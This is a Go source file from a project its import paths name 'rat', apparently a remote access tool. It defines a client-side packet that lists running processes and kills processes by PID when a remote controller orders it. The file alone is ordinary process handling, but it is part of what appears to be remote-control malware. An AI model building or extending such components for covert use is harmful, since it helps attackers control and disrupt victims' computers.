package main

import (
	"rat/client/process"
	"rat/shared/network/header"
	"rat/shared/processes"
)

type Process struct {
	Path string `network:"receive"`
	PID  int    `network:"send,receive"`
}

type ProcessPacket struct {
	Action    int       `network:"send,receive"`
	Processes []Process `network:"send,receive"`
}

func (packet ProcessPacket) Header() header.PacketHeader {
	return header.ProcessHeader
}

func (packet *ProcessPacket) Init() {
	process.QueryProcesses()

	for _, proc := range process.Processes {
		packet.Processes = append(packet.Processes, Process{
			PID:  proc.PID,
			Path: proc.Path,
		})
	}
}

func (packet ProcessPacket) OnReceive() error {
	t := packet.Action

	for _, proc := range packet.Processes {
		if t == processes.Kill {
			process.Kill(proc.PID)
		}
	}

	switch t {
	case processes.Query:
		Queue <- &ProcessPacket{}
	default:
		// error
	}

	return nil
}
